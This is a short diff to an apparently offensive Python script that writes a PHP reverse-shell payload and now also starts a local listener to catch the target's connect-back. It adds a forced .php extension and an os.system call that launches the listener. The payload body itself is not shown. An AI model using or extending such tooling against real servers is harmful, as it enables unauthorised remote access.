@@ -18,8 +18,14 @@ if (len(sys.argv) == 4):
 	if (os.path.isdir(path)):
 		print '[!] Invalid filename: ' + path + ' is a directory!'
 		exit()
+
+	# Checking if filename ends with valid extension
+	extension = path.split('.')[-1]
+	if 'php' not in extension:
+		path += '.php'
+
 else:
-	print '[!] Usage: %s <ip> <port> <filename>' % (sys.argv[0])
+	print '[!] Usage: %s <ip> <local port> <filename>' % (sys.argv[0])
 	exit()
 
 code = """
@@ -144,5 +150,9 @@ try:
 		payload.write (code)
 
 	print '[+] Payload created successfully in ' + os.path.abspath(path)
+	
+	print '[*] Setting up a listener. In order to receive a connect back you have to deploy the payload to the target system..'
+	os.system('expect nca.sh -l ' + port)
+
 except:
 	print '[!] Error writing the payload.'
